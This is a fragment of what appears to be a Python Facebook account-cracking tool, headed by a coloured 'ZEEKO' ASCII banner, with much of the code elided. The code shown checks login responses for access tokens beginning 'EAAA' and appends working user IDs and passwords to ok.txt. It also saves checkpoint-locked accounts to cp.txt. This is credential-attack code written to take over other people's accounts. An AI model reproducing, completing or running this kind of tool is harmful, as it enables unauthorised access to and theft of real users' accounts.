...
\033[91;1m ______ _____ _____ _   _______ 
\033[94;1m |___  /|  ___|  ___| | / /  _  |
 \033[97;1m   / / | |__ | |__ | |/ /| | | |
 \033[96;1m  / /  |  __||  __||    \| | | |
\033[95;1m ./ /___| |___| |___| |\  \ \_/ /
\033[93;1m \_____/\____/\____/\_| \_/\___/ 
	...
	def main(arg):
		...
		try:
			...
			if "access_token" in q and "EAAA" in q:
				print(" \033[1;32m [D8NO-OK] "+uid+" | "+pass1+"\033[0;97m")
				ok = open("ok.txt", "a")
				ok.write(uid+"|"+pass1+"\n")
				ok.close()
				...
				if "www.facebook.com" in q["error_msg"]:
					print(" \033[1;33m [D8NO-CP] "+uid+" | "+pass1+"\033[0;97m")
					cp = open("cp.txt", "a")
					cp.write(uid+"|"+pass1+"\n")
					cp.close()
